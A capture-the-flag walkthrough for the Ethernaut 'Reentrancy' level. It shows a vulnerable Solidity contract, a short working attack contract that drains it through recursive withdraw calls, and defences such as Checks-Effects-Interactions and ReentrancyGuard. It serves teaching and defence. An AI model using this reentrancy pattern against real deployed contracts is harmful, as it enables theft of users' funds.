---
description: classic reentrancy attack
---

# 10 - Reentrancy

Ethernaut Level10: [Reentrancy](https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}d
```

### Goal of this level

* steal all the funds from the contract

### What you should know before

* reentrancy attack\
  \-> see [here](https://www.youtube.com/watch?v=4Mm3BCyHtDY)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

This level can easily be solved using classic reentrancy attack.

</details>

```solidity
contract AttackReentrance {
    function attack(Reentrance reentranceContract) external payable {
        reentranceContract.donate{value: msg.value}(address(this));
        reentranceContract.withdraw(0.001 ether);
    }

    receive() external payable {
        msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", 0.001 ether));
    }
}
```

Call `attack` function with `0.001 ether` .

Done! 😎

## Key Takeaways

* To prevent reentrancy attack, you must make sure you are usning **Checks-Effects-Interactions** pattern
* Or use [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment)
* You can also use transfer or send function to limit gas, this is not recommended.

